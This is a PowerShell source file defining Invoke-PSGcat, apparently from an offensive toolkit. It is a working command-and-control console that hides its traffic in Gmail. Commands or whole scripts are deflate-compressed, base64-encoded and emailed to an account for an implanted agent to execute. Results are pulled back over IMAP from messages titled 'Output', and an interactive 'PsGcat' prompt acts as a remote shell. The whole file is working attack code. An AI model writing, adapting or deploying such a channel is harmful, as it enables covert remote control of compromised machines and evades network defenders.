function Invoke-PSGcat
{   
    [CmdletBinding(DefaultParameterSetName="Interactive")] Param(
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="Interactive")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $Username,
        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="Interactive")]
        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $Password,
        [Parameter(Position = 2, Mandatory = $false, ParameterSetName="Interactive")]
        [Parameter(Position = 2, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $AgentID,
        [Parameter(Position = 3, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $Payload,
        [Parameter(Position = 4, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $ScriptPath,
        [Parameter(Mandatory = $false, ParameterSetName="NonInteractive")]
        [Switch]
        $NonInteractive,
        [Parameter(Mandatory = $false)]
        [Switch]
        $GetOutput
    )
    function SendCommand ($Payload, $Username, $Password)
    {
        try 
        {
            $ms = New-Object IO.MemoryStream
            $action = [IO.Compression.CompressionMode]::Compress
            $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
            $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
            $Payload | ForEach-Object {$sw.WriteLine($_)}
            $sw.Close()
            $Compressed = [Convert]::ToBase64String($ms.ToArray())
            $smtpserver = "smtp.gmail.com"
            $msg = new-object Net.Mail.MailMessage
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
            $msg.From = "$username@gmail.com"
            $msg.To.Add("$username@gmail.com")
            $msg.Subject = "Command"
            $msg.Body = "##" + $Compressed
            $smtp.Send($msg)
            Write-Output "Command sent to $username@gmail.com"
        }
        catch 
        {
            Write-Warning "Something went wrong! Check if Username/Password are correct and you can connect to gmail from insecure apps." 
            Write-Error $_
        }
    }
    function ReadResponse
    {
        try 
        {
            $tcpClient = New-Object -TypeName System.Net.Sockets.TcpClient
            $tcpClient.Connect("imap.gmail.com", 993)
            if($tcpClient.Connected) 
            {
                [System.Net.Security.SslStream] $sslStream = $tcpClient.GetStream()
                $sslStream.AuthenticateAsClient("imap.gmail.com");
                if($sslStream.IsAuthenticated) 
                {
                [System.IO.StreamWriter] $sw = $sslstream
                [System.IO.StreamReader] $reader = $sslstream
                $script:result = ""
                $sb = New-Object System.Text.StringBuilder
                $mail =""
                $responsebuffer = [Array]::CreateInstance("byte", 2048)
                function ReadResponse ($command)
                {
                    $sb = New-Object System.Text.StringBuilder
                    if ($command -ne "")
                    {
                        $buf = [System.Text.Encoding]::ASCII.GetBytes($command)
                        $sslStream.Write($buf, 0, $buf.Length)
                    }
                    $sslStream.Flush()
                    $bytes = $sslStream.Read($responsebuffer, 0, 2048)
                    $str = $sb.Append([System.Text.Encoding]::ASCII.GetString($responsebuffer))
                    $sb.ToString()
                    $temp = $sb.ToString() | Select-String "\* SEARCH"
                    if ($temp)
                    {
                        $fetch = $temp.ToString() -split "\$",2
                        $tmp = $fetch[0] -split "\* SEARCH " -split " " -replace "`n"
                        [int]$mail = $tmp[-1]
                        $cmd = ReadResponse("$ FETCH $mail BODY[TEXT]`r`n", "1")
                        $cmd -replace '='
                    }
                }
                ReadResponse ""
                ReadResponse ("$ LOGIN " + "$Username@gmail.com" + " " + "$Password" + "  `r`n") | Out-Null
                ReadResponse("$ SELECT INBOX`r`n") | Out-Null
                ReadResponse("$ SEARCH SUBJECT `"Output`"`r`n")
                ReadResponse("$ LOGOUT`r`n")  | Out-Null
                } 
                else 
                {
                    Write-Error "You were not authenticated. Quitting."
                }
            } 
            else 
            {
                Write-Error "You are not connected to the host. Quitting"
            }
        }
        catch 
        {
            Write-Warning "Something went wrong! Check if Username/Password are correct, you can connect to gmail from insecure apps and if there is output email in the inbox" 
            Write-Error $_
        }
    }
    if ($GetOutput)
    {
        Write-Verbose "Reading Output from Gmail"
        ReadResponse ""
    }
    elseif ($NonInteractive)
    {
        if ($ScriptPath)
        {
            $Payload = [IO.File]::ReadAllText("$ScriptPath") -replace "`n"
            Write-Verbose "Sending Payload to $Username@gmail.com $Payload"
            SendCommand $Payload $Username $Password
        }
        else
        {
            Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
            SendCommand $Payload $Username $Password
        }
    }
    else
    {
        while($Payload -ne "exit")
        {
            Write-Output "Use GetOutput to get output."
            Write-Output "Use Script to specify a script."
            $Payload = Read-Host -Prompt "PsGcat"
            if ($Payload -eq "GetOutput")
            {
                Write-Verbose "Reading Output from Gmail"
                ReadResponse ""
            }
            if ($Payload -eq "Script")
            {
                $path = Read-Host -Prompt "Provide complete path to the PowerShell script."
                $Payload = [IO.File]::ReadAllText("$path") -replace "`n"
                Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
                SendCommand $Payload $Username $Password
            }
            else
            {
                Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
                SendCommand $Payload $Username $Password
            }
        }
    }
}
